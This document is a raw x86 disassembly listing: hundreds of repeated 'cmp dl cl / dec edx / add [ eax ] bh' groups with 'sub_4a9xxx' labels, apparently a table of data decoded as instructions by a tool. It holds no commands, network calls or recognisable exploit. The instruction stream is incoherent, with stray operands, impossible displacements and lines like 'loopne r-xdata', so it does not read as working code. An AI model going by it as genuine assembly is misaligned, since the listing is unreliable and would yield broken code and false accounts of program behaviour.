dec edx
add [ eax ] bh
0x4a
sub_4a900c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9014
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a901c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9024
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a902c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9034
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a903c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9044
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a904c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9054
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a905c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9064
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a906c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9074
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a907c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9084
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a908c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9094
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a909c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a90fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9104
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a910c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9114
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a911c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9124
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a912c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9134
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a913c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9144
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a914c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9154
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a915c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9164
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a916c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9174
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a917c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9184
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a918c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9194
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a919c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a91fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9204
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a920c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9214
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a921c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9224
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a922c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9234
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a923c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9244
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a924c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9254
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a925c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9264
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a926c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9274
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a927c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9284
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a928c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9294
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a929c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a92fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9304
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a930c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9314
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a931c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9324
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a932c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9334
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a933c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9344
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a934c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9354
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a935c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9364
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a936c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9374
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a937c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9384
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a938c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9394
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a939c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a93fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9404
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a940c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9414
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a941c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9424
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a942c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9434
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a943c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9444
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a944c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9454
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a945c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9464
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a946c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9474
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a947c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9484
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a948c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9494
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a949c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a94fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9504
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9538
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a959c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a95a4
dec eax
cld
dec eax
add [ eax ] bh
0x4a
sub_4a95f8
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a9604
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a960c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9614
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a961c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9624
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a962c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9634
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a963c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9644
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a964c
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a9658
cmp dl cl
dec edx
add [ eax ] bh
in eax 0x43
add [ eax - 0x1b ] ch
inc ebx
add ah cl
in eax 0x43
add [ eax + ebp * 8 + 0x43 ] dl
add [ edx + ebp * 8 + 0x43 ] bh
add [ eax ] bh
0x4a
sub_4a9674
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a967e
inc ebx
add [ eax ] bh
0x4a
sub_4a9740
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9748
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9750
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9758
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9760
cmp dl cl
dec edx
add al ch
sub [ esi ] eax
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9770
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9778
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9780
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9788
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9790
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9798
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a97a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a97a8
add al 0x2b
inc esi
add [ eax ] bh
0x4a
sub_4a97b2
inc esi
add [ eax ] bh
0x4a
sub_4a97dc
or al 0x3e
inc esi
add [ eax ] bh
0x4a
sub_4a980c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a985c
les ecx [ esi + 0x46 ]
add [ edi + ecx * 2 ] bl
inc esi
add [ eax ] bh
dec edi
inc esi
add [ edi + ecx * 2 + 0x46 ] ch
add [ eax ] bh
0x4a
sub_4a9872
inc esi
add [ eax ] bh
0x4a
sub_4a9878
mov ah 0x56
inc esi
add [ eax + 0x57 ] cl
inc esi
add [ edi + edx * 2 + 0x59240046 ] ch
inc esi
add [ eax ] bh
0x4a
sub_4a9938
in al dx
lodsb [ esi ]
inc esi
add [ ecx + esi * 4 - 0x4d17ffba ] cl
inc esi
add ah bl
mov bh 0x46
add [ eax ] bh
0x4a
sub_4a994c
cmp dl cl
dec edx
add al bh
mov ebp 0xbe200046
inc esi
add [ eax + eax * 8 - 0x3c7fffba ] ah
inc esi
add [ eax ] bh
0x4a
sub_4a9964
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a996c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9974
rol ch 0x1
inc esi
add [ ecx + ecx * 8 + 0x46 ] cl
add [ esp + ecx * 8 + 0x46 ] dh
add [ ecx + edx * 8 ] bl
inc esi
add [ eax ] bh
0x4a
sub_4a9988
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9994
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a999c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99cc
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a99d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a99f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9a00
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9a2c
push 0x940048b8
mov eax 0xbc780048
dec eax
add [ eax ] bh
0x4a
sub_4a9a3c
or al 0xc0
dec eax
add [ eax ] bh
0x4a
sub_4a9adc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ae4
loopne r-xdata
dec edx
add [ eax ] bh
0x4a
inc esp
add [ eax + 0x9 ] bh
inc esp
add [ eax ] bh
0x4a
sub_4a9af8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b00
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b08
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b20
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a9b2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b64
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ edx + ebp + 0x44 ] ah
add [ eax ] bh
0x4a
sub_4a9b74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9b9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ba4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9bac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9bb4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9bbc
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax * 4 - 0x35c7ffbb ] ah
dec edx
add [ eax ] bh
0x4a
sub_4a9bd0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9bd8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9be0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9be8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9bf0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9bf8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c00
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c08
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c10
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c18
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c20
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c28
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c30
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c38
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c40
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c48
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c50
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c58
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c60
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c68
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9c9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ca4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9cac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9cb4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9cbc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9cc4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ccc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9cd4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9cdc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ce4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9cec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9cf4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9cfc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9d9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9da4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9dac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9db4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9dbc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9dc4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9dcc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9dd4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ddc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9de4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9dec
cmp dl cl
dec edx
add [ eax - 0x33ffba89 ] ah
ja r-xdata
cmp dl cl
dec edx
add [ eax ] bh
0x4a
add [ eax ] bh
0x4a
sub_4a9e04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9e9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ea4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9eac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9eb4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ebc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ec4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ecc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ed4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9edc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ee4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9eec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ef4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9efc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9f9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fa4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fb4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fbc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fc4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fcc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fd4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fdc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fe4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9fec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ff4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a9ffc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa004
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa00c
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa018
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa020
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa028
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa030
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa038
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa040
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa048
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa050
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa058
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa060
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa068
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa070
cmp dl cl
